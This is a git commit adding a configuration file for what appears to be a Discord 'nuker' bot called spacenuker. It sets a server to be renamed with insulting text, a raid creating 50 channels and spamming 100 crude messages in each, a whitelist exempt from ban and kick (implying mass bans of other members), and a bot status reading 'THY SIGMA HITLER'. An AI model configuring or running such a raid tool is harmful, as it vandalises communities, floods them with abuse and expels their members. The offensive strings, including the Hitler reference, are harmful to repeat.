ebb95dc436ffdb0dcddc8e4c13a1496b3ee24ab8
Angel <118688687+AngelPodcast@users.noreply.github.com>
2024-07-24 13:45:07 -0400

    Add files via upload

---
+++ spacenuker/config.py
@@ -0,0 +1,42 @@
+EMBED_CONFIG = {
+    "title": "L",    # Maine Embed Title here 
+    "description": "haha l",   # Main Embed Description here 
+    "color": 0xFF5733,   # Change embed color if you want (red)
+    "fields": [
+        {"name": "???", "value": "fart", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
+        {"name": "???", "value": "gyat", "inline": False},
+        {"name": "???", "value": "ohio", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False
+    ],
+    "image": "",   # Embed Icon url here → https://image.jpg
+    "footer": "",  # Embed Footer here 
+}
+
+SERVER_CONFIG = {
+    "new_name": "haha yall suck",  # New Server Name here 
+    "new_icon": "",   # New Server Icon url here → https://image.jpg 
+    "new_description": "we are buttholes",  # New Server Description here 
+}
+
+WEBHOOK_CONFIG = {
+    "default_name": "fart",  # Webhook Name here 
+}
+
+
+AUTO_RAID_CONFIG = {
+    'num_channels': 50,  # Number of channels
+    'channel_type': 'text',  # text/voice
+    'channel_name': 'i eat poo',  # Channel name
+    'num_messages': 100,  # Number of message to spam
+    'message_content': 'lick my ass bro' # Spam Message
+}
+
+NO_BAN_KICK_ID = {
+    000000000000,       # Put Whitelist ID
+    111111111111,       # No Ban & No Kick
+    222222222222,
+}
+
+BOT_PRESENCE = {
+    "type": "playing",  # "playing", "listening", or "watching"
+    "text": "THY SIGMA HITLER"  # Your text presence
+}
